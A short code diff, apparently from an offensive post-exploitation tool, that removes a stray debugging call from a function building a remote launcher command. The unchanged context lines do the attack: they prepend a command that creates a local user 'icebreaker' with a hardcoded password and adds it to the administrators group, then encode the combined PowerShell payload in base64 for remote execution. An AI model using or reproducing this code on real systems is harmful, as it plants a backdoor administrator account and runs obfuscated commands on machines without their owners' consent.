@@ -1108,7 +1108,6 @@ def get_launcher_cmd(base_url, token):
         decoded_ps_b64 = base64.b64decode(ps_b64).decode('ascii').replace('\0','')
         add_user_cmd = 'net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add;'
         decoded_ps_cmd = add_user_cmd + decoded_ps_b64
-        embed()
         remote_cmd = ps_args + base64.b64encode(decoded_ps_cmd.encode('UTF-16LE')).decode('utf-8')
 
         return remote_cmd
